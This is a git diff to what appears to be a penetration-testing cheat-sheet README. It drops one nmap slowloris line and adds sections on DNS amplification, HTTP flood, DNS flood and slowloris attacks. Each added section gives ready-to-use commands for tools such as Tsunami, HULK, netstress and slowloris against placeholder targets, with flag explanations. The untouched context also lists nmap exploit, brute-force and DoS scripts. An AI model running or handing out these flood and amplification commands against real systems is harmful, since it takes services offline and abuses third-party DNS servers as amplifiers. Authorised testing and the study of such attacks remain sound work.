@@ -30,8 +30,6 @@ Nmap is a security scanner, originally written by Gordon Lyon, used to discover 
 | Actively exploit detected vulnerabilities | `nmap --script exploit -Pn <target.com` |
 | Brute Force Passwords | `nmap --script brute -Pn <target.com>` |
 | Test if target is vulnerable to DoS | `nmap --script dos -Pn <target.com>` |
-| Perform DoS attack | `nmap -max-parallelism 750 -Pn --script http-slowloris --script-args` |
-
 
 ## Nikto
 
@@ -78,4 +76,66 @@ hping is a command-line oriented TCP/IP packet assembler/analyzer. The interface
 ```
 ***
 
+## DNS Amplification
 
+You need to have a recursive DNS server which has a karge file on the cache. You are supposed to use
+<a href="https://www.infosec-ninjas.com/tsunami">Tsunami</a>
+
+Example of the attack can be as follows:
+
+`./tsunami -o recursive_dns.txt -1 4 -e 172.0.0.0/8`
+
+Then it's possible to attack the target with using these DNS Servers as an amplifier:
+
+`./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt`
+
+Where 
+`-s` is the target IP address
+`-n` optional doman name to probe
+`-f` the open recursive DNS servers file for the attack
+`-p` number of packets to be sent per DNS server
+
+## HTTP Flood
+
+HTTP flood is the most common attack that targeting application layer. It’s more difficult to detect than network layer attacks because requests seem to be legitimate. Since the 3-way handshake has already been completed, HTTP floods are fooling devices and solutions which are only examining layer 4.
+
+You will need <a href="https://github.com/grafov/hulk/blob/master/hulk.py">HULK</a> for this:
+
+`python hulk.py -site TARGET_SITE`
+
+## DNS Flood
+
+Domain Name System(DNS) is the protocol used to resolve domain names into IP addresses.
+
+Like other flood attacks, the aim of DNS flood attacks is sending high-volume DNS requests to the DNS application protocol. The DNS server overwhelmed and unable to process all of the legitimate requests from other users.
+
+You will need <a href="https://sourceforge.net/projects/netstressng/">netstress</a>:
+
+`netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53`
+
+Where
+`-d` is the destination address
+`-a` is the type of attack
+`-t` is the type of DNS query
+`-n` is the number of processes
+`-P` is the destination port
+
+## Low and Slow Attacks
+
+Unlike floods, low and slow attacks do not require a huge amount of data traffic. These types of attacks target application or server resources.
+
+They are hard to detect because the traffic appears to occur at normal rates and legitimate.
+
+My favorite tool is <a href="https://github.com/llaera/slowloris.pl">slowloris</a>:
+
+| Steps | Command |
+| :--- | :--- |
+| Start an attack | `./slowloris.pl -dns TARGET_URL` |
+| Change the port | `./slowloris.pl -dns TARGET_URL -port 80 -num 200` |
+| Change Timeout value | `./slowloris.pl -dns TARGET_URL -port 80 -num 200 -timeout 30` |
+| Attack an HTTPS website | `./slowloris.pl  -dns TARGET_URL -port 443 -timeout 30 -num 200 -https` |
+
+
+```diff
++ You are encouraged to make pull requests and add more tools
+``` 
